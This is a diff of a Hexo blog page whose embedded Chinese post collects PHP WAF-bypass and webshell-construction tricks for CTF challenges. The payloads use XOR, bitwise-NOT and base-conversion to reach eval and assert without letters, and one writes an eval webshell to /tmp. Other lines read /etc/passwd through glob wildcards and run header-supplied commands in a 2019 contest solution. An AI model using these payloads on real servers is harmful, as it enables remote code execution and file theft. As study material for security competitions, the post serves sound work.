@@ -1,335 +1,341 @@
+
 <!DOCTYPE html>
-
-
-
-  
-
-
-<html class="theme-next muse use-motion" lang="zh">
-<head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform">
-<meta http-equiv="Cache-Control" content="no-siteapp">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
-
-
-
-
-  
-  
-  
-  
-
-  
+<html lang="zh-cn">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Hexo">
+    <title>极限利用 - Hexo</title>
+    <meta name="author" content="John Doe">
     
     
-  
-
-  
-
-  
-
-  
-
-  
-
-  
     
-    
-    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
-  
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
-
-<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css">
-
-
-  <meta name="keywords" content="Hexo, NexT">
-
-
-
-
-
-
-
-
-  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2">
-
-
-
-
-
-
-<meta name="description" content="trickphp短标签php一共支持四种标签形式  详细内容参考http://w3c.3306.biz/php_course/show-12-17-1.html 123456&amp;lt;?php ?&amp;gt;  //最常用的一种形式，不解释&amp;lt;?= ?&amp;gt;   //类似于&amp;lt;?php echo &quot;&quot;;?&amp;gt;&amp;lt;script language=php&amp;gt; &amp;lt;/script">
-<meta property="og:type" content="article">
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"articleBody":"\n\ntrickphp短标签php一共支持四种标签形式 \n详细内容参考http://w3c.3306.biz/php_course/show-12-17-1.html\n123456&lt;?php ?&gt;  //最常用的一种形式，不解释&lt;?= ?&gt;   //类似于&lt;?php echo \"\";?&gt;&lt;script language=php&gt; &lt;/script&gt;  //等效于&lt;?php ?&gt;&lt;% echo \"\"; %&gt;     //asp风格的标签\n\n全局变量$GLOBALS\n这个全局变量数组中存放在php中的所有变量，变量名就是键名\nlinux glob通配符*代表任意字符\n?一个字符\n命令续行符\\  如果命令太长可以使用续行符，把一行命令拆成多行\n运算异或\n相同返回0 不同返回1\n取反\n~\n利用shell方面异或构造利用异或来构造GET(因为get比post短，容易构造,当然构造Post也可以)\npython脚本\n123456arr=[chr(i) for i in range(ord('a'),ord('z'))] + [chr(j) for j in range(ord('A'),ord('Z'))]str_list = ['`','~','!','@','%','^','*','(',')','-','+','&#123;','&#125;','[',']',':','&lt;','&gt;','.',',',';','|']for i in str_list:    for j in str_list:        s = chr(ord(i)^ord(j))        print(i,j,s)\n\n_GET组合\n123456789! ~ _    : &#125; G&#123; &gt; E&#125; ) T//:&#123;&#125;^&#125;&gt;)  ==&gt; GET\n\n测试\n1234567&lt;?phpfunction getflag()&#123;\techo \"success\";&#125;$a = $_GET['a'];eval($a);?&gt;\n\n两种方式\nno.1 直接构造getflag，调用  \n1?a=$_='[[]|@[['^'&lt;&gt;):,:&lt;';$_();\n\nno.2 先构造_GET，然后通过get调用getflag\n12?a=$&#123;'!:&#123;&#125;'^'~&#125;&gt;)'&#125;&#123;'_'&#125;();&amp;_=getflag?a=$&#123;'!:&#123;&#125;'^'~&#125;&gt;)'&#125;['_']();&amp;_=getflag\n\n如果对参数有长度有限制，第二种要比第一种好一点\n进一步\n构造assert执行shell\n1?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=file_put_contents(&apos;/tmp/shell.php&apos;,&apos;&lt;?php eval($_POST[shell]);?&gt;&apos;)\n\n这里还有两个东西 php可变变量 复杂变量 \n具体参考\nhttps://www.php.net/manual/zh/language.variables.variable.php\n取反构造参考链接\nhttps://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell/\n原理\n123456&gt;&gt;&gt; print(\"和\".encode())b'\\xe5\\x92\\x8c'&gt;&gt;&gt; print(\"和\".encode()[2])140&gt;&gt;&gt; print(~\"和\".encode()[2])-141\n\n“和”的第三个字节的值为140[0x8c]，取反的值为-141。负数用十六进制表示，通常用的是补码的方式表示。负数的补码是它本身的值每位求反,最后再加一。141的16进制为0xff73，php中chr(0xff73)==115，115就是s的ASCII值。\n1234567&lt;?php$_=\"和\";print(~($_&#123;2&#125;));print(~\"\\x8c\");?&gt;//输出 ss\n\npython脚本\n123456import urllib.parsedef get(shell):    hexbit=''.join(map(lambda x: hex(~(-(256-ord(x)))),shell))    return hexbitresult=get('get').replace('0x','%')print(result)\n\nno.1 直接调用 getflag\n12(~%98%9a%8b%99%93%9e%98)();   //这样貌似也可以，但是我没复现出来，还是老方法?a=$_=(~%98%9a%8b%99%93%9e%98);$_();\n\nno.2 同样构造_GET调用\n1?a=$&#123;~%a0%b8%ba%ab&#125;&#123;'_'&#125;();&amp;_=getflag\n\n只用数字构造PHP中true+true==2  \n不为空的字符串为true，对字符串取非,在取非就能获得1\n参考链接\nhttps://xz.aliyun.com/t/5677\n123456789101112//构造truevar_dump(!@a);  ==&gt; bool(false)var_dump(!!@a);  ==&gt; bool(true)var_dump(true+true); ==&gt;  int(2)var_dump((!!@a+!!@a)*(!!@a+!!@a)); ==&gt; int(4)  //使用*运算var_dump((!!@a+!!@a)**(!!@a+!!@a+!!@a));  ==&gt; int(8)  //使用**运算符，进行指数运算，php5.6才有chr((!!@a+!!@a+!!@a+!!@a)**(!!@a+!!@a+!!@a)+!!@a+!!@a+!!@a+!!@a+!!@a+!!@a+!!@a);  ==&gt;Gchr((!!@a+!!@a+!!@a+!!@a)**(!!@a+!!@a+!!@a)+!!@a+!!@a+!!@a+!!@a+!!@a); ==&gt;Echr((!!@a+!!@a+!!@a)**(!!@a+!!@a+!!@a+!!@a)+!!@a+!!@a+!!@a); ==&gt;Tchr((!!@a+!!@a+!!@a+!!@a)**(!!@a+!!@a+!!@a)+!!@a+!!@a+!!@a+!!@a+!!@a+!!@a+!!@a).chr((!!@a+!!@a+!!@a+!!@a)**(!!@a+!!@a+!!@a)+!!@a+!!@a+!!@a+!!@a+!!@a).chr((!!@a+!!@a+!!@a)**(!!@a+!!@a+!!@a+!!@a)+!!@a+!!@a+!!@a);  ==&gt; GET\n\n另一种构造true的思路\n12345$_=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;')print($_)print($_/$_)结果会输出：2 1\n\n不可见字符123&lt;?php    $_ = $_GET['a'] ^ $_GET['b'];    print(urlencode($_));\n\n_GET ^ %ff%ff%ff%ff  ==&gt;  %A0%B8%BA%AB\n异或两次，得到原字符\n%A0%B8%BA%AB  ^  %ff%ff%ff%ff  ==&gt; _GET\nglob通配符利用* ? 可以绕过waf\n如果waf会检测cat等命令或者文件名，可以用* ? 通配符绕过\n/bin/?at /etc/passwd  这样就可以读到/etc/passwd文件的内容\n还有执行运算符`` 可以执行命令\n`` ==&gt;shell_exec\n进制转换构造36进制，由36个字符构成，0-9 a-z \n可以出现字母的函数\n123456789hex2bin 16进制字符转到ascii字符bin2hex  ascii字符到16进制字符base_convert 2-36进制转换dechex 10==&gt;16hexdec 16==&gt;10\n\n貌似进制越低，长度越短\n以2019国赛初赛的一道题为例\nlove_math\n123456789101112131415161718192021222324252627282930313233&lt;?php    $content = $_GET['c'];      if (strlen($content) &gt;= 80) &#123;        die(\"太长了不会算\");    &#125;        $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]'];    foreach ($blacklist as $blackitem) &#123;        if (preg_match('/' . $blackitem . '/m', $content)) &#123;            die(\"请不要输入奇奇怪怪的字符\");        &#125;    &#125;    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];    preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs);    foreach ($used_funcs[0] as $func) &#123;        if (!in_array($func, $whitelist)) &#123;            die(\"请不要输入奇奇怪怪的函数\");        &#125;    &#125;eval('echo '.$content.';');?&gt;\n\n这里有好几种构造方式\n贴上几个\n1234?c=$&#123;1&#125;=base_convert(779914,10,36)^dechex(34661);$&#123;$&#123;1&#125;&#125;&#123;0&#125;($&#123;$&#123;1&#125;&#125;&#123;1&#125;)&amp;0=highlight_file&amp;1=/flagrois大佬的system(getallheaders()&#123;9&#125;)在请求头里加上9这个字段名 值是要执行的命令 比如9:cat /flag\n\n这里说一下构造过程\n因为36进制里面没有_GET等字符（只有36个字符0-9 a-z小写），所以要利用^，\n先通过异或构造_GET\n12$_ = $_GET['a'] ^ $_GET['b'];print(urlencode($_));\n\n这里用的a=8765 b=_GET\n得到gpsa 四个字母都在36进制的范围内，然后把gpsa 36转10进制  \n8765 16进制==&gt;10进制\n12var_dump(base_convert($_GET['char'], 36, 10));  ==&gt;779914var_dump(hexdec(8765));     ==&gt;34661\n\n后面的就是通过php的一个复杂变量的调用，读文件\n1$&#123;$&#123;1&#125;&#125;&#123;0&#125;($&#123;$&#123;1&#125;&#125;&#123;1&#125;)==&gt;$&#123;$&#123;_GET&#125;&#125;&#123;highlight_file&#125;($&#123;$&#123;_GET&#125;&#125;&#123;/flag&#125;)\n\n记录一下小套路其实就是要构造一个$_GET[arr]()\n利用可变函数，来实现payload的执行\n在还可以通过其他的全局变量$ENV $SERVER $GLOBAL $FILES 以及特殊的函数 getallheaders get_var_definded\n参考链接\nhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\nhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html\nhttps://www.xmsec.cc/ciscn-2019-web-wp/\n其他的链接都放在文中了\n","dateCreated":"2019-09-19T19:18:00+08:00","dateModified":"2020-02-06T10:13:01+08:00","datePublished":"2019-09-19T19:18:00+08:00","description":"","headline":"极限利用","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/19/极限利用/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"url":"http://yoursite.com/2019/09/19/极限利用/"}</script>
+    <meta name="description" content="trickphp短标签php一共支持四种标签形式  详细内容参考http://w3c.3306.biz/php_course/show-12-17-1.html 123456&amp;lt;?php ?&amp;gt;  //最常用的一种形式，不解释&amp;lt;?= ?&amp;gt;   //类似于&amp;lt;?php echo &quot;&quot;;?&amp;gt;&amp;lt;script language=php&amp;gt; &amp;lt;/script">
+<meta property="og:type" content="blog">
 <meta property="og:title" content="极限利用">
 <meta property="og:url" content="http://yoursite.com/2019/09/19/极限利用/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="trickphp短标签php一共支持四种标签形式  详细内容参考http://w3c.3306.biz/php_course/show-12-17-1.html 123456&amp;lt;?php ?&amp;gt;  //最常用的一种形式，不解释&amp;lt;?= ?&amp;gt;   //类似于&amp;lt;?php echo &quot;&quot;;?&amp;gt;&amp;lt;script language=php&amp;gt; &amp;lt;/script">
-<meta property="og:locale" content="zh">
-<meta property="og:updated_time" content="2019-11-17T12:27:23.722Z">
+<meta property="og:locale" content="zh-cn">
+<meta property="og:updated_time" content="2020-02-06T02:13:01.895Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="极限利用">
 <meta name="twitter:description" content="trickphp短标签php一共支持四种标签形式  详细内容参考http://w3c.3306.biz/php_course/show-12-17-1.html 123456&amp;lt;?php ?&amp;gt;  //最常用的一种形式，不解释&amp;lt;?= ?&amp;gt;   //类似于&amp;lt;?php echo &quot;&quot;;?&amp;gt;&amp;lt;script language=php&amp;gt; &amp;lt;/script">
+    
+    
+        
+    
+    
+    
+    
+    
+    <!--STYLES-->
+    <link rel="stylesheet" href="/assets/css/style-6tgl0yz7lnfzkusrxanjzjinweinxlhwhjly7phr1vxoylo39j7uvbjbwsfg.min.css">
+    <!--STYLES END-->
+    
 
+    
 
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Muse',
-    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: true,
-    duoshuo: {
-      userId: '0',
-      author: 'Author'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-
-  <link rel="canonical" href="http://yoursite.com/2019/09/19/极限利用/">
-
-
-
-
-
-  <title>极限利用 | Hexo</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+    
+        
+    
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh">
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
 
-  
-  
-    
-  
 
-  <div class="container sidebar-position-left page-post-detail ">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
     
 
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Hexo</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
+<header id="header" data-behavior="4">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a
+            class="header-title-link"
+            href="/ "
+            aria-label=""
+        >
+            Hexo
+        </a>
     </div>
-      
-        <p class="site-subtitle"></p>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
+    
         
-        <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
-            
-            Home
-          </a>
-        </li>
-      
+            <a
+                class="header-right-picture "
+                href="#about"
+                aria-label="打开链接: /#about"
+            >
         
-        <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
-            
-            Archives
-          </a>
-        </li>
-      
         
-        <li class="menu-item menu-item-tags">
-          <a href="/tags/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
-            
-            Tags
-          </a>
-        </li>
-      
+        </a>
+    
+</header>
 
-      
-    </ul>
-  
+            <!-- Define author's picture -->
 
-  
+
+<nav id="sidebar" data-behavior="4">
+    <div class="sidebar-container">
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/"
+                            
+                            rel="noopener"
+                            title="首页"
+                        >
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">首页</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-categories"
+                            
+                            rel="noopener"
+                            title="分类"
+                        >
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">分类</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-tags"
+                            
+                            rel="noopener"
+                            title="标签"
+                        >
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">标签</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-archives"
+                            
+                            rel="noopener"
+                            title="归档"
+                        >
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">归档</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link open-algolia-search"
+                            href="#search"
+                            
+                            rel="noopener"
+                            title="搜索"
+                        >
+                        <i class="sidebar-button-icon fa fa-search" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">搜索</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="#about"
+                            
+                            rel="noopener"
+                            title="关于"
+                        >
+                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">关于</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://github.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="GitHub"
+                        >
+                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="http://stackoverflow.com/users"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Stack Overflow"
+                        >
+                        <i class="sidebar-button-icon fab fa-stack-overflow" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Stack Overflow</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://twitter.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Twitter"
+                        >
+                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Twitter</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://facebook.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Facebook"
+                        >
+                        <i class="sidebar-button-icon fab fa-facebook" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Facebook</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://plus.google.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Google Plus"
+                        >
+                        <i class="sidebar-button-icon fab fa-google-plus" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Google Plus</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://www.linkedin.com/profile/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="LinkedIn"
+                        >
+                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">LinkedIn</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/mailto"
+                            
+                            rel="noopener"
+                            title="邮箱"
+                        >
+                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">邮箱</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/atom.xml"
+                            
+                            rel="noopener"
+                            title="RSS"
+                        >
+                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">RSS</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
 </nav>
 
-
-
- </div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
             
-
-  <div id="posts" class="posts-expand">
+            <div id="main" data-behavior="4"
+                 class="
+                        hasCoverMetaIn
+                        ">
+                
+<article class="post">
     
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/19/极限利用/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
     
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">极限利用</h1>
-        
-
+        <div class="post-header main-content-wrap text-left">
+    
+        <h1 class="post-title">
+            极限利用
+        </h1>
+    
+    
         <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-19T19:18:00+08:00">
-                2019-09-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
+    <time datetime="2019-09-19T19:18:00+08:00">
+	
+		    9月 19, 2019
+    	
+    </time>
     
+</div>
 
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</div>
 
-      
-      
-
-      
-        <a id="more"></a>
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <a id="more"></a>
 
 <h2 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h2><h3 id="php短标签"><a href="#php短标签" class="headerlink" title="php短标签"></a>php短标签</h3><p>php一共支持四种标签形式 </p>
 <p>详细内容参考<a href="http://w3c.3306.biz/php_course/show-12-17-1.html" target="_blank" rel="noopener">http://w3c.3306.biz/php_course/show-12-17-1.html</a></p>
@@ -431,336 +437,324 @@
 <p>后面的就是通过php的一个复杂变量的调用，读文件</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;<span class="number">1</span>&#125;&#125;&#123;<span class="number">0</span>&#125;($&#123;$&#123;<span class="number">1</span>&#125;&#125;&#123;<span class="number">1</span>&#125;)==&gt;$&#123;$&#123;_GET&#125;&#125;&#123;highlight_file&#125;($&#123;$&#123;_GET&#125;&#125;&#123;/flag&#125;)</span><br></pre></td></tr></table></figure>
 
+<h2 id="记录一下小套路"><a href="#记录一下小套路" class="headerlink" title="记录一下小套路"></a>记录一下小套路</h2><p>其实就是要构造一个<code>$_GET[arr]()</code></p>
+<p>利用可变函数，来实现payload的执行</p>
+<p>在还可以通过其他的全局变量$ENV $SERVER $GLOBAL $FILES 以及特殊的函数 getallheaders get_var_definded</p>
 <p>参考链接</p>
 <p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
 <p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
 <p><a href="https://www.xmsec.cc/ciscn-2019-web-wp/" target="_blank" rel="noopener">https://www.xmsec.cc/ciscn-2019-web-wp/</a></p>
 <p>其他的链接都放在文中了</p>
 
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/09/19/commix-testbed/" rel="next" title="commix-testbed">
-                <i class="fa fa-chevron-left"></i> commix-testbed
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/09/20/hacker101/" rel="prev" title="hacker101">
-                hacker101 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-
-    <div class="post-spread">
-      
-    </div>
-  </div>
-
-
-          </div>
-          
-
-
-          
-  <div class="comments" id="comments">
-    
-  </div>
 
 
         </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
         
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview">
-            Overview
-          </li>
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/20/hacker101/"
+                    data-tooltip="hacker101"
+                    aria-label="上一篇: hacker101"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/19/commix-testbed/"
+                    data-tooltip="commix-testbed"
+                    aria-label="下一篇: commix-testbed"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
         </ul>
-      
-
-      <section class="site-overview sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="John Doe">
-          <p class="site-author-name" itemprop="name">John Doe</p>
-           
-              <p class="site-description motion-element" itemprop="description"></p>
-          
-        </div>
-        <nav class="site-state motion-element">
-
-          
-            <div class="site-state-item site-state-posts">
-              <a href="/archives/">
-                <span class="site-state-item-count">47</span>
-                <span class="site-state-item-name">posts</span>
-              </a>
-            </div>
-          
-
-          
-
-          
-
-        </nav>
-
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Diesen Beitrag teilen"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
         
-
-        <div class="links-of-author motion-element">
-          
-        </div>
-
-        
-        
-
-        
-        
-
-        
-
-
-      </section>
-
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
             
-              
             
-
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/19/极限利用/"
+                    title="分享到 Facebook"
+                    aria-label="分享到 Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#trick"><span class="nav-number">1.</span> <span class="nav-text">trick</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php短标签"><span class="nav-number">1.1.</span> <span class="nav-text">php短标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#全局变量"><span class="nav-number">1.2.</span> <span class="nav-text">全局变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux-glob通配符"><span class="nav-number">1.3.</span> <span class="nav-text">linux glob通配符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令续行符"><span class="nav-number">1.4.</span> <span class="nav-text">命令续行符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#运算"><span class="nav-number">1.5.</span> <span class="nav-text">运算</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用"><span class="nav-number">2.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#shell方面"><span 